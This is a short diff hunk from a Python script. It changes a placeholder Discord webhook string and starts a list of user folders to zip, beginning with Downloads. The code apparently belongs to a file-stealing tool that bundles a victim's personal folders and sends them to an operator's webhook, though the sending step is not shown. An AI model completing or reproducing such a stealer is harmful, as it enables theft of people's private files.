@@ -5,7 +5,7 @@ import requests
 import multiprocessing
 from discord import SyncWebhook, Embed
 
-webhook = "YOUR WEBHOOK HERE"
+webhook = "YOUR-WEBHOOK-HERE"
 
 dirs_to_zip = [
     os.path.join(os.environ.get("USERPROFILE"), "Downloads"),
